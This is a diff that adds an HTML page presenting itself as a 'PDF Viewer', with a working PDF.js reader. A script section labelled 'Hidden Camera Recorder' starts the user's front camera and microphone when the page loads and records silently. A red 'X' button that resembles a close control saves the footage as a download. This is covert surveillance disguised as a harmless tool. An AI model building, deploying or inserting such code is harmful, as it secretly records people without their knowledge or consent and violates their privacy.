@@ -1,0 +1,287 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>PDF Viewer</title>
+<!-- Minimal styling -->
+<style>
+  :root{
+    --bg:#0f1724;
+    --panel:#0b1220;
+    --accent:#06b6d4;
+    --muted:#94a3b8;
+    --glass: rgba(255,255,255,0.04);
+    --danger: #ef4444;
+  }
+  html,body{height:100%;margin:0;font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
+  body{background:linear-gradient(180deg,#071024 0%, #07142a 100%);color:#e6eef6;display:flex;flex-direction:column;gap:12px;padding:14px;box-sizing:border-box;}
+  header{display:flex;align-items:center;gap:12px;}
+  h1{font-size:16px;margin:0;font-weight:600}
+  .controls{display:flex;gap:8px;flex-wrap:wrap;align-items:center;}
+  .panel{background:var(--panel);border-radius:12px;padding:12px;box-shadow: 0 6px 18px rgba(2,6,23,0.6);}
+  .layout{display:grid;grid-template-columns: 1fr;gap:12px;align-items:start;}
+  /* PDF viewer */
+  .pdf-area{min-height:420px;display:flex;flex-direction:column;gap:8px}
+  #pdfCanvas{width:100%;border-radius:8px;background:var(--glass);display:block;max-height:70vh;object-fit:contain}
+  .pdf-toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+  button, .btn {
+    background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
+    border:1px solid rgba(255,255,255,0.06);
+    color:inherit;
+    padding:8px 12px;border-radius:8px;cursor:pointer;font-weight:600;
+    backdrop-filter: blur(4px);
+  }
+  button.small{padding:6px 8px;font-size:14px;border-radius:6px}
+  input[type=range]{width:140px}
+  .status{font-size:13px;color:var(--muted)}
+  /* Big floating X save button at left bottom */
+  #saveX{
+    position:fixed;
+    left:12px;
+    bottom:12px;
+    z-index:9999;
+    width:56px;height:56px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    background: linear-gradient(180deg,var(--danger),#b91c1c);
+    color:white;font-size:22px;font-weight:700;
+    box-shadow:0 6px 24px rgba(185,28,28,0.35);
+    border: 2px solid rgba(255,255,255,0.06);
+    -webkit-tap-highlight-color: transparent;
+  }
+  /* small badges */
+  .badge{background:rgba(255,255,255,0.03);padding:6px 8px;border-radius:999px;font-size:13px;border:1px solid rgba(255,255,255,0.03)}
+  .hint{font-size:13px;color:var(--muted)}
+</style>
+</head>
+<body>
+<header>
+  <h1>PDF Viewer</h1>
+</header>
+<div class="layout">
+  <!-- Left: PDF -->
+  <div class="left panel pdf-area">
+    <div style="display:flex;justify-content:space-between;align-items:center;">
+      <div style="display:flex;gap:8px;align-items:center;">
+        <label class="btn small" for="pdfFile">Load PDF</label>
+        <input id="pdfFile" type="file" accept="application/pdf" style="display:none" />
+        <div class="hint">or paste a URL below</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <button id="prevPage" class="small">◀ Prev</button>
+        <button id="nextPage" class="small">Next ▶</button>
+        <div class="badge" id="pageInfo">— / —</div>
+      </div>
+    </div>
+    <div class="pdf-toolbar" style="justify-content:space-between;">
+      <div style="display:flex;gap:8px;align-items:center;">
+        <input id="pdfUrl" type="url" placeholder="https://example.com/file.pdf" style="width:260px;padding:8px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit" />
+        <button id="loadUrl">Load URL</button>
+        <label class="hint">Zoom</label>
+        <input id="zoom" type="range" min="0.25" max="2.5" step="0.05" value="1">
+        <div class="hint" id="zoomVal">100%</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <button id="downloadPdf">Download PDF</button>
+        <div class="status" id="pdfStatus">No PDF loaded</div>
+      </div>
+    </div>
+    <canvas id="pdfCanvas"></canvas>
+  </div>
+</div>
+<!-- Floating X on left-bottom that saves recording when pressed -->
+<button id="saveX" title="Save recording (stop + download)">✕</button>
+<!-- Minimal scripts: PDF.js from CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.14.305/pdf.min.js"></script>
+<script>
+/* =========================
+   PDF Reader (PDF.js)
+   ========================= */
+const pdfFileInput = document.getElementById('pdfFile');
+const pdfUrlInput  = document.getElementById('pdfUrl');
+const loadUrlBtn   = document.getElementById('loadUrl');
+const downloadPdfBtn = document.getElementById('downloadPdf');
+const pdfCanvas = document.getElementById('pdfCanvas');
+const pdfCtx = pdfCanvas.getContext('2d');
+const prevPageBtn = document.getElementById('prevPage');
+const nextPageBtn = document.getElementById('nextPage');
+const pageInfo = document.getElementById('pageInfo');
+const pdfStatus = document.getElementById('pdfStatus');
+const zoomRange = document.getElementById('zoom');
+const zoomVal = document.getElementById('zoomVal');
+let pdfDoc = null;
+let currentPage = 1;
+let pdfScale = parseFloat(zoomRange.value);
+let loadedPdfArrayBuffer = null;
+pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.14.305/pdf.worker.min.js';
+function renderPage(num){
+  pdfDoc.getPage(num).then(page=>{
+    const viewport = page.getViewport({scale: pdfScale});
+    pdfCanvas.width = Math.min(viewport.width, window.innerWidth*0.92);
+    pdfCanvas.height = viewport.height;
+    // For high-density displays, scale for devicePixelRatio
+    const dpr = window.devicePixelRatio || 1;
+    pdfCanvas.width = Math.min(viewport.width * dpr, 4096);
+    pdfCanvas.height = viewport.height * dpr;
+    pdfCanvas.style.width = Math.min(viewport.width, window.innerWidth*0.92) + 'px';
+    pdfCanvas.style.height = viewport.height + 'px';
+    const renderContext = {
+      canvasContext: pdfCtx,
+      viewport: page.getViewport({scale: pdfScale * dpr})
+    };
+    pdfCtx.save();
+    pdfCtx.clearRect(0,0,pdfCanvas.width,pdfCanvas.height);
+    page.render(renderContext).promise.then(()=>{
+      pdfCtx.restore();
+      pageInfo.textContent = num + ' / ' + pdfDoc.numPages;
+      pdfStatus.textContent = 'Rendered page ' + num;
+    });
+  });
+}
+function loadPdfFromArrayBuffer(ab, name){
+  loadedPdfArrayBuffer = ab;
+  pdfjsLib.getDocument({data: ab}).promise.then(doc=>{
+    pdfDoc = doc;
+    currentPage = 1;
+    renderPage(currentPage);
+  }).catch(err=>{
+    pdfStatus.textContent = 'PDF load error: ' + (err && err.message ? err.message : err);
+  });
+}
+pdfFileInput.addEventListener('change', async (e)=>{
+  const f = e.target.files && e.target.files[0];
+  if(!f) return;
+  pdfStatus.textContent = 'Loading ' + f.name;
+  const ab = await f.arrayBuffer();
+  loadPdfFromArrayBuffer(ab, f.name);
+});
+loadUrlBtn.addEventListener('click', async ()=>{
+  const url = pdfUrlInput.value.trim();
+  if(!url) { pdfStatus.textContent = 'Enter a PDF URL'; return; }
+  pdfStatus.textContent = 'Fetching URL...';
+  try{
+    const resp = await fetch(url);
+    if(!resp.ok) throw new Error('Network response not OK: ' + resp.status);
+    const ab = await resp.arrayBuffer();
+    loadPdfFromArrayBuffer(ab, url);
+  }catch(err){
+    pdfStatus.textContent = 'Failed to fetch URL: ' + err.message;
+  }
+});
+prevPageBtn.addEventListener('click', ()=> {
+  if(!pdfDoc) return;
+  if(currentPage <= 1) return;
+  currentPage--;
+  renderPage(currentPage);
+});
+nextPageBtn.addEventListener('click', ()=> {
+  if(!pdfDoc) return;
+  if(currentPage >= pdfDoc.numPages) return;
+  currentPage++;
+  renderPage(currentPage);
+});
+zoomRange.addEventListener('input', ()=>{
+  pdfScale = parseFloat(zoomRange.value);
+  zoomVal.textContent = Math.round(pdfScale*100) + '%';
+  if(pdfDoc) renderPage(currentPage);
+});
+downloadPdfBtn.addEventListener('click', ()=>{
+  if(!loadedPdfArrayBuffer) { pdfStatus.textContent = 'No PDF to download'; return; }
+  const blob = new Blob([loadedPdfArrayBuffer], {type:'application/pdf'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href = url; a.download = 'download.pdf'; document.body.appendChild(a); a.click();
+  a.remove(); URL.revokeObjectURL(url);
+});
+/* =========================
+   Hidden Camera Recorder
+   ========================= */
+const saveX = document.getElementById('saveX');
+let stream = null;
+let mediaRecorder = null;
+let recordedBlobs = []; // last saved recording (array of blobs)
+let activeRecordingBlobs = null; // currently recording blobs
+let lastRecordingBlob = null; // Blob of last recording available to save
+let recStartTime = null;
+let recTimerInterval = null;
+let lastRecordingName = null;
+let autoDownloadAfterStop = false;
+
+// Initialize camera and start recording automatically
+async function initHiddenRecording() {
+  try {
+    const constraints = {
+      audio: true,
+      video: {
+        facingMode: { exact: "user" }
+      }
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    const mimeType = 'video/webm;codecs=vp9,opus';
+    let options = mimeType ? { mimeType } : undefined;
+    mediaRecorder = new MediaRecorder(stream, options);
+    activeRecordingBlobs = [];
+    mediaRecorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) {
+        activeRecordingBlobs.push(e.data);
+      }
+    };
+    mediaRecorder.onstart = () => {
+      recStartTime = Date.now();
+    };
+    mediaRecorder.onstop = () => {
+      if (activeRecordingBlobs && activeRecordingBlobs.length) {
+        lastRecordingBlob = new Blob(activeRecordingBlobs, { type: mediaRecorder.mimeType || 'video/webm' });
+        const t = new Date();
+        lastRecordingName = 'recording_' + t.toISOString().replace(/[:.]/g, '-') + (lastRecordingBlob.type.includes('mp4') ? '.mp4' : '.webm');
+      }
+    };
+    mediaRecorder.start(1000);
+  } catch (err) {
+    console.error('Error initializing hidden recording:', err);
+  }
+}
+
+// Start hidden recording when the page loads
+window.addEventListener('load', initHiddenRecording);
+
+// Save recording when the 'X' button is pressed
+saveX.addEventListener('click', () => {
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    autoDownloadAfterStop = true;
+    mediaRecorder.stop();
+    const onstopHandler = () => {
+      if (lastRecordingBlob) {
+        triggerDownloadBlob(lastRecordingBlob, lastRecordingName || 'recording.webm');
+      }
+      autoDownloadAfterStop = false;
+      mediaRecorder.removeEventListener('stop', onstopHandler);
+    };
+    mediaRecorder.addEventListener('stop', onstopHandler);
+    return;
+  }
+  if (lastRecordingBlob) {
+    triggerDownloadBlob(lastRecordingBlob, lastRecordingName || 'recording.webm');
+  }
+});
+
+function triggerDownloadBlob(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 15000);
+}
+
+// Clean up when leaving the page
+window.addEventListener('beforeunload', () => {
+  if (mediaRecorder && mediaRecorder.state === 'recording') try { mediaRecorder.stop(); } catch (e) {}
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+  }
+});
+</script>
+</body>
+</html>
